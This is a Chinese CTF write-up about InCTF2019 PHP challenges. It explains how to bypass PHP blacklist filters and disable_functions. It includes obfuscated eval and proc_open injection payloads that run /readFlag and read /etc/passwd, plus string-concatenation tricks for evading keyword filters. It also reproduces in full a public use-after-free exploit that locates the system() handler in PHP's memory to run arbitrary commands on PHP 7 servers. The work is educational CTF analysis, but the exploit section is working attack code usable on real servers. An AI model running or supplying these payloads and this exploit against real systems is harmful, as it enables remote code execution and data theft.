# 从InCTF2019的一道题学习disable_function_bypass

阅读量 **138205**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-25 15:30:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0180f8c411e2d8c9f6.jpg)

## 前言

前段时间做了一道InCTF2019的几道Web题，觉得里面涉及的PHP disable function
bypass和字符串拼接特性挺有意思的，所以自己搭建了环境复现了下，并且在这里记录一下。

## PHP+1

打开题目直接得到源码：

    
    
    <?php
    // PHP+1
    $input = $_GET['input'];
    
    function check(){
      global $input;
      foreach (get_defined_functions()['internal'] as $blacklisted) {
          if (preg_match ('/' . $blacklisted . '/im', $input)) {
              echo "Your input is blacklisted" . "<br>";
              return true;
              break;
          }
      }
      $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
      unset($blacklist);
      return false;
    }
    
    $thisfille=$_GET['thisfile'];
    
    if(is_file($thisfille)){
      echo "You can't use inner file" . "<br>";
    }
    else{
      if(file_exists($thisfille)){
        if(check()){
          echo "Naaah" . "<br>";
        }else{
          eval($input);
        }
      }else{
        echo "File doesn't exist" . "<br>";
      }
    
    }
    
    function iterate($ass){
        foreach($ass as $hole){
            echo "AssHole";
        }
    }
    
    highlight_file(__FILE__);
    ?>
    

ps： 修正符`m`表示 将字符串视为多行,不管是那行都能匹配;

先分析下代码主要的执行流程：

（1）接受两个get请求参数，一个`input`，另一个`thisfile`，分别赋值给`$input`和`$thisfille`（注意拼写，两个l）；  
（2）第一层：传入的`$thisfille`需要同时满足`is_file($thisfille)`为`false`，`file_exists($thisfile)`为`true`；  
（3）第二层：如果`file_exists($thisfile)`为`true`，则进行`check()`函数检查；  
（4）`check()`函数中过滤了很多函数。

#####  第一层 is_file和file_exists绕过

`is_file`函数用来判断文件是否存在并且检查指定的文件名是否是正常的文件；

`file_exists`函数判断文件是否存在或者是目录是否存在;

`is_dir`函数判断目录是否存在。

也就是说，所以可以用一个目录路径来绕过`is_file`的检查，对任意目录，`is_file`会返回false，而`file_exists`会返回true。

#####  第二层 check函数绕过

在`check`函数中能看到一个看起来比较有趣的函数`get_defined_functions`，搜一下它的用法

    
    
    <?php
    function foo(){
        echo "This is my function foo.";
    }
    $arr = get_defined_functions();
    var_dump($arr);
    ?>
    

输出的结果包含所有的php自带的built-in函数和用户自定义函数：

    
    
    array (size=2)
      'internal' => 
        array (size=1460)
          0 => string 'zend_version' (length=12)
          1 => string 'func_num_args' (length=13)
          2 => string 'func_get_arg' (length=12)
          3 => string 'func_get_args' (length=13)
          4 => string 'strlen' (length=6)
          5 => string 'strcmp' (length=6)
          ...... more elements
          1456 => string 'xdebug_code_coverage_started' (length=28)
          1457 => string 'xdebug_get_function_count' (length=25)
          1458 => string 'xdebug_dump_superglobals' (length=25)
          1459 => string 'xdebug_get_headers' (length=18)
      'user' => 
        array (size=1)
          0 => string 'foo' (length=3)
    

返回结果包括两个数组，内置（internal）和用户自定义的函数。可以通过`$arr['internal']`来访问系统内置的函数，通过`$arr['user']`来访问用户自定义的函数。

![](https://p5.ssl.qhimg.com/t01cabab797491c2f1e.png)

在这里`eval`函数并不属于php的内置函数，所以可以绕过上面代码中第7至11行的检查。

在第14行过滤的`eval`，`die`和`exit`都不属于函数，它们都属于 **语言构造器（ language construct ）** 。

这里稍微介绍一下`language
construct`。从本质上讲，function是一段代码，它的编写方式可以在脚本执行过程中多次使用和重复使用。它可能被设计成接受参数和返回值，也可能两者都不接受，函数可以由用户定义。language
construct本身是PHP语言的一部分，也就是说，它们不能由用户定义，也不能通过扩展加入到PHP语言中，PHP解析器不能进一步分解它们，而函数在被解析之前必须进一步分解，会被分解为language
construct。

language
construct通常会比对应的function更快。而且我们可以通过设置在PHP配置文件，如`php.ini`中通过`disable_functions`禁用一些函数，但是无法禁用language
construct。而且language construct不能作为回调函数被调用。

这是来自 <https://www.php.net/manual/zh/function.eval.php> 对`eval`的解释：

![](https://p3.ssl.qhimg.com/t0156320ae9ee38d892.png)

`die`和`exit`一样，都是一个语言构造器，所以它们并不在函数`get_defined_functions`中返回的数组中。

而且在PHP中，`_()`也是一个函数，`_()`是`gettext`函数的别名。

![](https://p2.ssl.qhimg.com/t0110cd4b50d6ea3a07.png)

所以`_`也会被`$blacklist`过滤掉。

回到正题，虽然`$blacklist`过滤掉了很多php内置函数，但是`eval`函数依然是可以使用的，所以可以通过`eval`来执行命令：

    
    
    ?input=eval("highlight".$thisfille[8]."fil"."e('/etc/passwd');");&thisfile=/lib/x86_64-linux-gnu
    

![](https://p1.ssl.qhimg.com/t01e3e612adf6c099c7.png)

所以可以用`eval("sy"."stem('ls')")`来查看当前目录下的文件，但是并没有执行成功，因为`system`函数被禁用了。看一下有多少函数是`disable_functions`：

    
    
    ?input=eval("php"."info();");&thisfile=/var
    

![](https://p0.ssl.qhimg.com/t016a213b1bf3c89d57.png)

看一下`disable_functions`这一栏，有很多函数不能用：

    
    
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir
    

因为不知道flag到底在哪里，文件名是什么，所以肯定想看一下目录，一般flag文件会放在当前目录，根目录下或者是上一级目录里。常用的列目录的命令有：

    
    
    system('ls');
    scandir('/');
    

但是目前这些方法都被禁止了。所以我们要找到其他的相同功能的函数，一般这种题目考察的就是这些相对冷门的函数。

`glob`函数没有在上面的`disable_functions`之中，这个函数和`scandir`一样，可以用来查找文件，举个例子：

    
    
    <?php
    // 取得所有后缀为.txt的文件
    $files = glob('*.txt');
    print_r($files);
    ?>
    

上面会输出当前目录下的所有以`.txt`为后缀的文件：

    
    
    Array ( 
        [0] => Readme.txt 
        [1] => source.txt 
        [2] => test.txt 
    )
    

所以用`print_r(glob("*"))`就可以列出当前目录下的所有文件：

    
    
    ?input=eval('print'.$thisfille[8].'r(glo'.'b("*"));');&thisfile=/lib/x86_64-linux-gnu
    

得到的结果是：

    
    
    Array ( 
        [0] => 1.html 
        [1] => 5.html 
        [2] => index.html 
        [3] => index.php 
        [4] => save2json.html 
        [5] => version_2.html 
    )
    

再看看根目录：

    
    
    Array ( 
        [0] => /bin 
        [1] => /boot 
        [2] => /daily_lock 
        [3] => /dev 
        [4] => /etc 
        [5] => /flag 
        [6] => /home 
        [7] => /initrd.img 
        [8] => /initrd.img.old 
        [9] => /lib 
        [10] => /lib64 
        [11] => /lost+found 
        [12] => /media 
        [13] => /mnt 
        [14] => /opt 
        [15] => /proc 
        [16] => /readFlag 
        [17] => /root 
        [18] => /run 
        [19] => /sbin 
        [20] => /srv 
        [21] => /sys 
        [22] => /tmp 
        [23] => /usr 
        [24] => /var 
        [25] => /vmlinuz 
        [26] => /vmlinuz.old 
    )
    

flag应该就在`/flag`文件或是`/readFlag`文件中。所以接下来就要读这两个文件。

一般读取文件有两种方式。一种是通过系统命令执行linux的读文件命令，另一种是直接调用php的文件读取函数。常见的文件读取函数有：

    
    
    file_get_contents
    readfile
    fread
    fopen
    highlight_file
    show_source
    

前面的四个都被禁掉了，但是最后的`highlight_file`和`show_source`都没有被禁掉，所以还可以用这两个函数来读取文件内容

    
    
    // show_source("/flag");
    ?input=eval('show'.$thisfille[8].'source("/flag");');&thisfile=/lib/x86_64-linux-gnu
    
    // highlight_file("/readFlag");
    ?input=eval('highlight'.$thisfille[8].'fil'.'e("/readFlag");');&thisfile=/lib/x86_64-linux-gnu
    

发现什么输出都没有，猜测可能是普通用户根本就没有read的权限。如果不能读的话，猜测这可能是一个可执行文件，所以需要命令执行函数来执行该文件，该文件会输出flag内容。但是这里有两个flag，显然其中一个是用来迷惑我们的，但是目前还没有办法判断哪个是真的flag。

php中比较常见的命令执行函数有：

    
    
    exec — 执行一个外部程序
    passthru — 执行外部程序并且显示原始输出
    proc_open — 执行一个命令，并且打开用来输入/输出的文件指针
    pcntl_exec - 在当前进程空间执行指定程序
    shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
    system — 执行外部程序，并且显示输出
    popen - 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生
    ob_start - 打开输出控制缓冲
    mail - 发送邮件
    

这些函数的具体用法可以参考chybeta师傅的文章：

>
> [php代码/命令执行漏洞](//chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)
> )

这些函数中，有两个没有被ban，`ob_start`和`proc_open`。

**proc_open** 函数的具体用法可以参考： <https://www.w3cschool.cn/doc_php/php-function-proc-open.html>

语法：`resource proc_open ( string $cmd , array $descriptorspec , array &$pipes
[, string $cwd [, array $env [, array $other_options ]]] )`

`proc_open`会执行一个命令，并且会打开用来输入/输出的文件指针，输出在`$pipes[1]`中。

可以看一个最简单的例子，在读取`$pipes[1]`的时候还可以用`fgets`：

    
    
    <?php
    $proc = proc_open("echo foo",
      array(
        array("pipe","r"),
        array("pipe","w"),
        array("pipe","w")
      ),
      $pipes);
    print stream_get_contents( $pipes[1] );
    // 输出为 foo
    ?>
    

这里要注意的是第2行的`$proc`必须存在，下面的这个例子运行就会报错：

    
    
    <?php
    proc_open("echo foo",
      array(
        array("pipe","r"),
        array("pipe","w"),
        array("pipe","w")
      ),
      $pipes);
    print fgets( $pipes[1] );
    // Warning: stream_get_contents(): 3 is not a valid stream resource in t.php on line 9
    ?>
    

在官方文档给的例子下，有人给出的解释是：

> It seems you actually have to store the return value in order for your
> streams to exist. You can’t throw it away.

也就是说为了让流存在，必须要存储返回值，不能把这个返回值丢掉。

所以直接将这个返回值赋给一个变量就可以了，这里的payload是赋给了`$ret`变量，然后用`fgets`输出内容：

    
    
    ?input=$desc=array(array('p'.'ipe','r'),array('p'.'ipe','w'),array('p'.'ipe','w'));$pxpes=array();eval('$ret=proc'.$thisfille[8].'open("/readFlag",$desc,$pxpes);');eval('print(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-gnu
    

成功获得flag：

![](https://p0.ssl.qhimg.com/t01be800f719d865ed5.png)

但是读取`/flag`却是没有回显的，猜测还是和权限有关，可以这样验证一下：

    
    
    ?input=$desc=array(array('p'.'ipe','r'),array('p'.'ipe','w'),array('p'.'ipe','w'));$pxpes=array();eval('$ret=proc'.$thisfille[8].'open("ls%20-al%20/readFlag",$desc,$pxpes);');eval('print(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-gnu
    

得到的结果是：

    
    
    -r-s--x--x 1 root root 8608 May  6 07:52 /readFlag
    

而`ls -al /flag`可以发现，只有root用户才可以执行该文件，所以才会什么都没有返回：

    
    
    -r-------- 1 root root 8608 May  6 08:43 /flag
    

## PHP+1.5

然后看一下PHP+1的升级版，PHP+1.5

    
    
    <?php
    // php+1.5
    $input = $_GET['input'];
    
    function check()
    {
        global $input;
        foreach (get_defined_functions()['internal'] as $blacklisted) {
            if (preg_match('/' . $blacklisted . '/im', $input)) {
                echo "Your input is blacklisted" . "<br>";
                return true;
                break;
            }
        }
        $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
        if (preg_match("/$blacklist/i", $input)) {
            echo "Do you really you need that?" . "<br>";
            return true;
        }
    
        unset($blacklist);
        return false;
    }
    
    $thisfille = $_GET['thisfile'];
    
    if (is_file($thisfille)) {
        echo "You can't use inner file" . "<br>";
    } else {
        if (file_exists($thisfille)) {
            if (check()) {
                echo "Naaah" . "<br>";
            } else {
                eval($input);
            }
        } else {
            echo "File doesn't exist" . "<br>";
        }
    
    }
    
    function iterate($ass)
    {
        foreach ($ass as $hole) {
            echo "AssHole";
        }
    }
    
    highlight_file(__FILE__);
    ?>
    

和前面一道的差别就是多了对`$input`的`$blacklist`检查，也就是说禁掉了`eval`函数：

![](https://p3.ssl.qhimg.com/t01efe25ecbbfd38c6f.png)

所以上面这道题使用eval的解法已经不再适用了，但是php支持另一种看起来比较奇怪的字符串拼接方式：

    
    
    <?php
    $a = p.h.p.i.n.f.o;
    print $a();
    ?>
    

![](https://p5.ssl.qhimg.com/t016a5e0dfde10bbf4d.png)

可以看到，虽然有报错，但是还是执行了`phpinfo()`命令。

我们尝试一下读取phpinfo：

    
    
    ?input=$a=p.h.p.i.n.f.o;$a();&thisfile=/var
    

![](https://p0.ssl.qhimg.com/t0124676216acf09338.png)

payload1：

    
    
    ?input=
    $x=ch.r;
    $y=$x(95);
    $z=$x(47);
    $a=p.r.o.c.$y.o.p.e.n;
    $b=$z.readFlag;
    $c=p.i.p.es;
    $d=p.i.p.e;
    $e=r;
    $f=w;
    $i=ne.xt;
    $h=str.eam.$y.ge.t.$y.con.tents;
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    print($h($i($$c)));
    &thisfile=/var
    

稍微解释一下这个payload。$x是`chr`函数，$y是字符`_`，$z是字符`/`，用来拼接`/readFlag`用。

    
    
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    // equivalent to
    $k=proc_open('/readFlag',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
    

这里需要特别注意的是传入的是`$$c`，因为需要将`$pipes`变成一个变量，`$c`表示的仅仅是`pipes`，而不是`$pipes`。同样的，后面是

    
    
    print($h($i($$c)));
    // equivalent to
    print($stream_get_contents(next($pipes)));
    

另一个payload2，只是在提取`$pipes[1]`的时候有点区别：

    
    
    ?input=
    $x=ch.r;
    $y=$x(95);
    $z=$x(47);
    $a=p.r.o.c.$y.o.p.e.n;
    $b=$z.readFlag;
    $c=p.i.p.es;
    $d=p.i.p.e;
    $e=r;
    $f=w;
    $i=(arra).(y).$y.sh.ift;
    $j=(arr).(ay).$y.sl.ice;
    $h=str.eam.$y.ge.t.$y.con.tents;
    $k=$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);
    print($h($i($j($$c,1,2))));
    &thisfile=/var
    

## PHP+2.5

    
    
    //php2.5
    <?php
    
    $input = $_GET['input'];
    
    function check(){
      global $input;
      foreach (get_defined_functions()['internal'] as $blacklisted) {
          if (preg_match ('/' . $blacklisted . '/im', $input)) {
              echo "Your input is blacklisted" . "<br>";
              return true;
              break;
          }
      }
      $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
      if(preg_match("/$blacklist/i", $input)){
        echo "Do you really you need that?" . "<br>";
        return true;
      }
    
      unset($blacklist);
      if(strlen($input)>100){  #That is random no. I took ;)
        echo "This is getting really large input..." . "<br>";
        return true;
      }  
      return false;
    }
    
    $thisfille=$_GET['thisfile'];
    
    if(is_file($thisfille)){
      echo "You can't use inner file" . "<br>";
    }
    else{
      if(file_exists($thisfille)){
        if(check()){
          echo "Naaah" . "<br>";
        }else{
          eval($input);
        }
      }else{
        echo "File doesn't exist" . "<br>";
      }
    
    }
    
    function iterate($ass){
        foreach($ass as $hole){
            echo "AssHole";
        }
    }
    
    highlight_file(__FILE__);
    ?>
    

在这道题的环境中，`proc_open`函数是没有被禁用的，它的预期解法呢是找到一个segmentation
fault，然后使用文件上传和条件竞争来获取shell。

可以采用现成的[exp](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)：

    
    
    <?php
    
    $cmd = "id";
    
    $n_alloc = 10; # increase this value if you get segfaults
    
    class MySplFixedArray extends SplFixedArray {
        public static $leak;
    }
    
    class Z implements JsonSerializable {
        public function write(&$str, $p, $v, $n = 8) {
          $i = 0;
          for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
          }
        }
    
        public function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address <<= 8;
                $address |= ord($str[$p+$j]);
            }
            return $address;
        }
    
        public function ptr2str($ptr, $m = 8) {
            $out = "";
            for ($i=0; $i < $m; $i++) {
                $out .= chr($ptr & 0xff);
                $ptr >>= 8;
            }
            return $out;
        }
    
        # unable to leak ro segments
        public function leak1($addr) {
            global $spl1;
    
            $this->write($this->abc, 8, $addr - 0x10);
            return strlen(get_class($spl1));
        }
    
        # the real deal
        public function leak2($addr, $p = 0, $s = 8) {
            global $spl1, $fake_tbl_off;
    
            # fake reference zval
            $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
            $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
            $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)
    
            $leak = strlen($spl1::$leak);
            if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
    
            return $leak;
        }
    
        public function parse_elf($base) {
            $e_type = $this->leak2($base, 0x10, 2);
    
            $e_phoff = $this->leak2($base, 0x20);
            $e_phentsize = $this->leak2($base, 0x36, 2);
            $e_phnum = $this->leak2($base, 0x38, 2);
    
            for($i = 0; $i < $e_phnum; $i++) {
                $header = $base + $e_phoff + $i * $e_phentsize;
                $p_type  = $this->leak2($header, 0, 4);
                $p_flags = $this->leak2($header, 4, 4);
                $p_vaddr = $this->leak2($header, 0x10);
                $p_memsz = $this->leak2($header, 0x28);
    
                if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                    # handle pie
                    $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                    $data_size = $p_memsz;
                } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                    $text_size = $p_memsz;
                }
            }
    
            if(!$data_addr || !$text_size || !$data_size)
                return false;
    
            return [$data_addr, $text_size, $data_size];
        }
    
        public function get_basic_funcs($base, $elf) {
            list($data_addr, $text_size, $data_size) = $elf;
            for($i = 0; $i < $data_size / 8; $i++) {
                $leak = $this->leak2($data_addr, $i * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = $this->leak2($leak);
                    # 'constant' constant check
                    if($deref != 0x746e6174736e6f63)
                        continue;
                } else continue;
    
                $leak = $this->leak2($data_addr, ($i + 4) * 8);
                if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                    $deref = $this->leak2($leak);
                    # 'bin2hex' constant check
                    if($deref != 0x786568326e6962)
                        continue;
                } else continue;
    
                return $data_addr + $i * 8;
            }
        }
    
        public function get_binary_base($binary_leak) {
            $base = 0;
            $start = $binary_leak & 0xfffffffffffff000;
            for($i = 0; $i < 0x1000; $i++) {
                $addr = $start - 0x1000 * $i;
                $leak = $this->leak2($addr, 0, 7);
                if($leak == 0x10102464c457f) { # ELF header
                    return $addr;
                }
            }
        }
    
        public function get_system($basic_funcs) {
            $addr = $basic_funcs;
            do {
                $f_entry = $this->leak2($addr);
                $f_name = $this->leak2($f_entry, 0, 6);
    
                if($f_name == 0x6d6574737973) { # system
                    return $this->leak2($addr + 8);
                }
                $addr += 0x20;
            } while($f_entry != 0);
            return false;
        }
    
        public function jsonSerialize() {
            global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;
    
            $contiguous = [];
            for($i = 0; $i < $n_alloc; $i++)
                $contiguous[] = new DateInterval('PT1S');
    
            $room = [];
            for($i = 0; $i < $n_alloc; $i++)
                $room[] = new Z();
    
            $_protector = $this->ptr2str(0, 78);
    
            $this->abc = $this->ptr2str(0, 79);
            $p = new DateInterval('PT1S');
    
            unset($y[0]);
            unset($p);
    
            $protector = ".$_protector";
    
            $x = new DateInterval('PT1S');
            $x->d = 0x2000;
            $x->h = 0xdeadbeef;
            # $this->abc is now of size 0x2000
    
            if($this->str2ptr($this->abc) != 0xdeadbeef) {
                die('UAF failed.');
            }
    
            $spl1 = new MySplFixedArray();
            $spl2 = new MySplFixedArray();
    
            # some leaks
            $class_entry = $this->str2ptr($this->abc, 0x120);
            $handlers = $this->str2ptr($this->abc, 0x128);
            $php_heap = $this->str2ptr($this->abc, 0x1a8);
            $abc_addr = $php_heap - 0x218;
    
            # create a fake class_entry
            $fake_obj = $abc_addr;
            $this->write($this->abc, 0, 2); # type
            $this->write($this->abc, 0x120, $abc_addr); # fake class_entry
    
            # copy some of class_entry definition
            for($i = 0; $i < 16; $i++) {
                $this->write($this->abc, 0x10 + $i * 8, 
                    $this->leak1($class_entry + 0x10 + $i * 8));
            }
    
            # fake static members table
            $fake_tbl_off = 0x70 * 4 - 16;
            $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
            $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);
    
            # fake zval_reference
            $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
            $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)
    
            # look for binary base
            $binary_leak = $this->leak2($handlers + 0x10);
            if(!($base = $this->get_binary_base($binary_leak))) {
                die("Couldn't determine binary base address");
            }
    
            # parse elf header
            if(!($elf = $this->parse_elf($base))) {
                die("Couldn't parse ELF");
            }
    
            # get basic_functions address
            if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
                die("Couldn't get basic_functions address");
            }
    
            # find system entry
            if(!($zif_system = $this->get_system($basic_funcs))) {
                die("Couldn't get zif_system address");
            }
    
            # copy hashtable offsetGet bucket
            $fake_bkt_off = 0x70 * 5 - 16;
    
            $function_data = $this->str2ptr($this->abc, 0x50);
            for($i = 0; $i < 4; $i++) {
                $this->write($this->abc, $fake_bkt_off + $i * 8, 
                    $this->leak2($function_data + 0x40 * 4, $i * 8));
            }
    
            # create a fake bucket
            $fake_bkt_addr = $abc_addr + $fake_bkt_off;
            $this->write($this->abc, 0x50, $fake_bkt_addr);
            for($i = 0; $i < 3; $i++) {
                $this->write($this->abc, 0x58 + $i * 4, 1, 4);
            }
    
            # copy bucket zval
            $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
            for($i = 0; $i < 12; $i++) {
                $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
                    $this->leak2($function_zval, $i * 8));
            }
    
            # pwn
            $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
            $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
    
            $spl1->offsetGet($cmd);
    
            exit();
        }
    }
    
    $y = [new Z()];
    json_encode([&$y]);
    

###  PHP2.0

这道题的源码同PHP2.5，但是php环境为7.1，而且`proc_open`函数被禁用了。

这道题的解法可以参考OpenToAll的exp：<https://ctftime.org/writeup/16665>
。这个解法其实是利用了php的一个use after free
1day，具体可以看这里：<https://bugs.php.net/bug.php?id=77843> 。

并且这个解法只对Ubuntu16.04+PHP7.1的环境生效。

## 小结：

总结上面的内容，我们可以学习到：

1 . `proc_open`代码执行  
2 . php字符串拼接  
3 . eval特性  
4 . _()函数

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **serend1pity** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/240036](/post/id/240036)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)

 **+1** __2赞

 __收藏

![](https://p1.ssl.qhimg.com/t01d39bc53b49850b6e.png) serend1pity

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

